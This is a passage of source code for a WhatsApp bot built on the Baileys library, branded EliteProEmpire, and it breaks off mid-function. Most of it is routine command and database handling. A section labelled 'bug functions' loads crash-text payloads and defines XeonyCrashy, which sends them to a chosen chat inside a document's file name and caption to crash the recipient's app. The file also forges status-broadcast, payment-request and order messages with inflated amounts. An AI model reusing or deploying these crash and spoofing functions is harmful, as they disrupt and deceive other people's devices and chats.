require('./lib/listmenu.js')
const {
	downloadContentFromMessage,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    InteractiveMessage,
    getContentType
} = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const { color } = require('./lib/color.js')
const chalk = require('chalk')
const moment = require('moment-timezone')
const cron = require('node-cron')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')
const jsobfus = require('javascript-obfuscator')
const {translate} = require('@vitalets/google-translate-api')
const { download } = require('aptoide-scraper');
const scp2 = require('./lib/scraper2.js') 
const { xvideosSearch, xvideosdl, xnxxdl, xnxxSearch} = require('./lib/scraper3.js')
const pkg = require('imgur')
const { ImgurClient } = pkg
const uploadImage = require('./lib/uploadImage.js')
const client = new ImgurClient({ clientId: "a0113354926015a" })
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./lib/uploader.js')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./lib/converter.js')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
    GIFBufferToVideoBuffer,
    totalcase
} = require('./lib/myfunc.js')
const { xeon_antispam } = require('./lib/antispam.js')
//prem owner function
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun.js')
//store
const { 
addResponList, 
delResponList, 
isAlreadyResponList, 
isAlreadyResponListGroup, 
sendResponList, 
updateResponList, 
getDataResponList 
} = require('./lib/list.js')
//data
let ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'))
let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'))
const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'))
//media
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./EliteProMedia/database/xeonvn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./EliteProMedia/database/xeonsticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./EliteProMedia/database/xeonimage.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./EliteProMedia/database/xeonvideo.json'))
const DocXeon = JSON.parse(fs.readFileSync('./EliteProMedia/database/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./EliteProMedia/database/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./EliteProMedia/database/apk.json'))

//bug database
const { xeontext1 } = require('./src/data/function/XBug/xeontext1.js')
const { xeontext2 } = require('./src/data/function/XBug/xeontext2.js')
const { xeontext3 } = require('./src/data/function/XBug/xeontext3.js')
const { xeontext4 } = require('./src/data/function/XBug/xeontext4.js')
const { xeontext5 } = require('./src/data/function/XBug/xeontext5.js')
const { xeontext6 } = require('./src/data/function/XBug/xeontext6.js')
const wkwk = fs.readFileSync(`./src/data/function/XBug/x.mp3`)
const xsteek = fs.readFileSync(`./src/data/function/XBug/x.webp`)

//store database
const db_respon_list = JSON.parse(fs.readFileSync('./src/store/list.json'))

const xeonverifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []

//time
const xtime = moment.tz('Africa/Lagos').format('HH:mm:ss')
const xdate = moment.tz('Africa/Lagos').format('DD/MM/YYYY')
const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var xeonytimewisher = `🌌 *Good Night! Nighty night!*`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `🌃 *Good Evening! Time to relax, unwind!*`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `🌃 *Good Evening! Time to relax!*`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `🌅 *Good Afternoon! Recharge and refocus!*`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `🌄 *Good Morning! Sun's up, let's go!*`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `🌄 *Good Morning! fresh start!*`
 } 
//function
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
//module
module.exports = EliteProEmpire = async (EliteProEmpire, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
       var body = (
  m.mtype === 'conversation' ? m.message.conversation :
  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id :
  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === 'messageContextInfo' ?
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
    m.text :
  ''
);
        var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix
        const isCmd = body.startsWith(prefix)
        //prefix2 and command2 particulary for auto download
        const prefix2 = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
        const isCmd2 = body.startsWith(prefix2)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await EliteProEmpire.decodeJid(EliteProEmpire.user.id)
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const xeonymisc = (m.quoted || m)
        const quoted = (xeonymisc.mtype == 'buttonsMessage') ? xeonymisc[Object.keys(xeonymisc)[1]] : (xeonymisc.mtype == 'templateMessage') ? xeonymisc.hydratedTemplate[Object.keys(xeonymisc.hydratedTemplate)[1]] : (xeonymisc.mtype == 'product') ? xeonymisc[Object.keys(xeonymisc)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const xeonybody = body.startsWith(pric)
        const isCommand = xeonybody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await EliteProEmpire.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        //anti media
        const isEliteProMedia = m.mtype
        //user status
        const isUser = xeonverifieduser.includes(sender)
        const XeonTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= XeonTheCreator || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(EliteProEmpire, m, premium)
        
        //theme sticker reply
        const XeonStickWait = () => {
        let XeonStikRep = fs.readFileSync('./EliteProMedia/theme/sticker_reply/wait.webp')
        EliteProEmpire.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
 
 //bug functions
const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};
//bug functions
const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Xeon's ur father`
}}
}
async function XeonyCrashy(dgxeon,chat) {
EliteProEmpire.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgxeon}.${xeontext1}` ,
caption: `${dgxeon + xeontext1}`,
}, {quoted: subscribe_dgxeon })
}
//end bug functions

        //premium
        async function replyprem(teks) {
    reply(`This feature is for premium user, contact the owner to become premium user`)
}
        //script replier
        async function sendEliteProEmpireMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await EliteProEmpire.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
        //Chinedu-MD reply settings 
        async function reply(teks) {
            if (typereply === 'v1') {
                m.reply(teks)
            } else if (typereply === 'v2') {
                EliteProEmpire.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: 'Enjoy unlimited features 🫠🫠',
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                            sourceUrl: wagc
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });
            } else if (typereply === 'v3') {
               EliteProEmpire.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: 'Enjoy unlimited features 🫠🫠',
                        thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        sourceUrl: websitex,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: m })
            } else if (typereply === 'v4') {
                reply2(teks)
            }
        }
        
        //fake reply with channel link embedded
async function reply2(txt) {
const xeonnewrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "ELITE-PRO-V2",
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: botname,
body: 'Enjoy unlimited features 🫠🫠',
thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
sourceUrl: websitex
},
},
text: txt,
}
return EliteProEmpire.sendMessage(from, xeonnewrep, {
quoted: m,
})
}
            
        let fstatus = { 
            key: { 
               fromMe: false, 
               participant: `0@s.whatsapp.net`,  
               ...(m.chat ? {  remoteJid: "status@broadcast"  } : {}) 
            }, 
               message: {  
                  "imageMessage": { 
                     "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", 
                     "mimetype": "image/jpeg", 
                     "caption": botname,
                     "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", 
                     "fileLength": "28777",
                     "height": 1080,
                     "width": 1079,
                     "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                     "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                     "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                     "mediaKeyTimestamp": "1610993486",
                     "jpegThumbnail": await reSize(thumb, 100, 100),
                     "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                  }
               }
            }
            
            //Fake quoted 
        const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id:global.botname, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.botname}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=2348109263390:2348109263390\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
	    const frpayment = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}
            
            const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
        
        //database
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? 1000 : 100
            let user = global.db.data.users[sender]
            if (typeof user !== 'object') global.db.data.users[sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('badword' in user)) user.badword = 0
                if (!('title' in user)) user.title = ''
                if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex') 
                if (!('afkReason' in user)) user.afkReason = ''
                if (!('nick' in user)) user.nick = EliteProEmpire.getName(sender)
                if (!isPremium) user.premium = false
                if (!('totalLimit' in user)) user.totalLimit = 0
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[sender] = {
               serialNumber: randomBytes(16).toString('hex'),
               title: `${isPremium ? 'Premium' : 'User'}`,
               afkTime: -1,
               badword: 0,
               afkReason: '',
               nick: EliteProEmpire.getName(sender),
               premium: `${isPremium ? 'true' : 'false'}`,
               limit: limitUser,
               totalLimit: 0
            }
            
               let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                  if (!('badword' in chats)) chats.badword = false
                  if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
                  if (!('antibot' in chats)) chats.antibot = false
                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
                  if (!('antispam' in chats)) chats.antispam = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antivirtex' in chats)) chats.antivirtex = false
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = false
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = false
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = false
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('antidocument' in chats)) chats.antidocument = false
                  if (!('antilink' in chats)) chats.antilink = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
                  if (!('antipromotion' in chats)) chats.antipromotion = false
               } else global.db.data.chats[from] = {
                  badword: false,
                  antiforeignnum: false,
                  antibot: false,
                  antiviewonce: false,
                  antispam: false,
                  antivirtex: false,
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antilink: false,
                  antipromotion: false,
                  antilinkgc: false
               }
            
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autodownload' in setting)) setting.autodownload = false 
               if (!('autobio' in setting)) setting.autobio = false 
               if (!('autoread' in setting)) setting.autoread = false
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindia' in setting)) setting.onlyindia = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
               if (!('watermark' in setting)) setting.watermark = { packname , author }
               if (!('about' in setting)) setting.about = { bot: { nick: EliteProEmpire.getName(botNumber), alias: botname}, owner: { nick: EliteProEmpire.getName(global.ownernumber + '@s.whatsapp.net'), alias: global.ownernumber}}
//Chinedu-MD Fix (1)              
if (!('autoreact' in setting)) setting.autoreact = false;               
            } else global.db.data.settings[botNumber] = {
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autodownload: false,
               autobio: false,
               autoread: false,
               autoblocknum: false,
               onlyindia: false,
               onlyindo: false,
               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,
               watermark: {
                  packname: global.packname, 
                  author: global.author
               },
               about: {
                  bot: {
                     nick: EliteProEmpire.getName(botNumber), 
                     alias: botname
                  },
                  owner: {
                     nick: EliteProEmpire.getName(global.ownernumber + '@s.whatsapp.net'), 
                     alias: global.ownernumber
                  }
               }
            }
            
        } catch (err) {
            console.log(err)
        }
       
        //photo uploader
        async function uploadtoimgur(imagepath) {
  try {
    const response = await client.upload({
      image: fs.createReadStream(imagepath),
      type: 'stream',
    })

    let url = response.data.link
    console.log(url)
    return url
  } catch (error) {
    console.error('Error uploading image to Imgur:', error)
    throw error
  }
}        
        async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

//Chinedu-MD auto react 
// Auto-react message function
const elitereact = async (m) => {
  try {
    // Check if auto-react is enabled
    if (!db.data.settings[botNumber].autoreact) return;
    
    // Prevent bot from reacting to its own messages
    if (m.key.fromMe) return;
    
    // Define the emoji list
const emojis = ["😂", "🤣", "😭", "😡", "🤔", "😎", "😍", "🥳", "😱", "🤖", "😈", "👻", "💀", "👽", "☠️", "😇", "😅", "😜", "🤩", "🤪", "😴", "😢", "😳", "🙈", "🐵", "🐶", "🐱", "🐯", "🐻", "🦁", "🐲", "🐉", "🦄", "🌚", "🌝", "🌟", "💫", "🔥", "🌪️", "⚡", "💥", "💔", "❤️", "💚", "💙", "💛", "💜", "🖤", "💯", "✨", "💎", "🔔", "🎉", "🎊", "🎈", "🏆", "🥇", "🎵", "🎶", "🎸", "🥁", "🎷", "🎺", "🕺", "💃", "👯", "🧍", "🧑‍🤝‍🧑", "🙋", "🤷", "👋", "🤝", "👍", "👎", "✊", "👌", "🙏"];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]; // Pick a random emoji
    
    // Send a single random reaction
    await EliteProEmpire.sendMessage(m.chat, {
      react: {
        text: randomEmoji,
        key: m.key
      }
    });
  } catch (err) {
    console.error("Error in elitereact:", err);
  }
};

//autoreact
const xeonreact = async () => {
  const emojis = ["👨‍💻", "🤙", "😂", "🤣", "😭", "🫂", "💔", "😡"]; 
  for (const emoji of emojis) {
    await sleep(80);
    EliteProEmpire.sendMessage(m.chat, { react: { text: emoji, key: m.key }});
  }
  await sleep(50);
  EliteProEmpire.sendMessage(m.chat, { react: { text: randomemoji, key: m.key }});
}

//bug loading
async function loading () {
var xeonlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 👨‍💻..."
]
let { key } = await EliteProEmpire.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await EliteProEmpire.sendMessage(from, {text: xeonlod[i], edit: key })
}
} 

const xeonimun = (texto) => {
EliteProEmpire.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return m.reply("Erro..")
})
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

//sticker meta function
async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
  const {
      default: {
            Image
                }
                  } = await import('node-webpmux')
                    const img = new Image()
                      const json = {
                          'sticker-pack-id': 'Natsxe',
                              'sticker-pack-name': packname,
                                  'sticker-pack-publisher': author,
                                      'emojis': categories,
                                          'is-avatar-sticker': 1,
                                              ...extra
                                                }
                                                  let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
